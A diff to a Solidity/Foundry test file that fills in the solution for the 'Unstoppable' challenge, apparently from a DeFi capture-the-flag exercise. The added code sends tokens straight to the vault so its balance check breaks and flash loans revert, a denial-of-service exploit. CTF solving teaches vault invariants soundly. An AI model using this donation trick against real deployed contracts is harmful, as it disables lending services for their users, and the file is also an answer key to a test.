@@ -89,10 +89,15 @@ contract UnstoppableChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * CODE SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // Transfer tokens to the vault to cause inconsistency
+        token.transfer(address(vault), 1e18);
+    
+        // Expect the flash loan to revert due to inconsistency
+        vm.expectRevert();
+        monitorContract.checkFlashLoan(100e18);
     }
 
     /**
